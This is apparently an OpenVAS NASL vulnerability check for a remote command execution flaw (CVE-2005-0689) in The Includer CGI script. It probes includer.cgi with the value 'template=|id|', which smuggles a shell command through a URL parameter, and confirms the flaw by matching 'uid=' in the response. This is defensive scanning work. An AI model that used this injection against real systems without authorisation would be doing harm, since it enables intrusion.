# OpenVAS Vulnerability Test
# $Id: includer_rcmdexec.nasl 17 2013-10-27 14:01:43Z jan $
# Description: The Includer remote command execution flaw
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote web server contains a PHP script that is affected by a
remote code execution vulnerability. 

Description:

The remote host is running The Includer, a PHP script for emulating
server-side includes. 

The version of The Includer installed on the remote host allows an
attacker to execute arbitrary shell commands by including shell
meta-characters as part of the URL.";

tag_solution = "Unknown at this time.";

desc = "
  Summary:
  " + tag_summary + "
  Solution:
  " + tag_solution;



if (description) {
  script_id(20296);
  script_version("$Revision: 17 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_bugtraq_id(12738);
  script_cve_id("CVE-2005-0689");
  script_xref(name:"OSVDB", value:"14624");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");

  name = "The Includer remote command execution flaw";
  script_name(name);
 
  script_description(desc);
 
  summary = "The Includer remote command execution detection";
  script_summary(summary);
 
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2005 David Maciejak");
  family = "Web application abuses";
  script_family(family);

  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_dependencies("http_version.nasl");

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://marc.theaimsgroup.com/?l=bugtraq&amp;m=111021730710779&amp;w=2");
  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! port ) exit(0);

# Loop through directories.
if (thorough_tests) dirs = make_list("/includer", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  req = http_get(
    item:string(
      dir, "/includer.cgi?",
      "template=", SCRIPT_NAME
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  if (
    "document.write" >< res &&
    "uid=" >!< res
  ) {
    http_check_remote_code (
      unique_dir:dir,
      check_request:"/includer.cgi?template=|id|",
      check_result:"uid=[0-9]+.*gid=[0-9]+.*",
      command:"id",
      description:desc,
      port:port
    );
  }
}
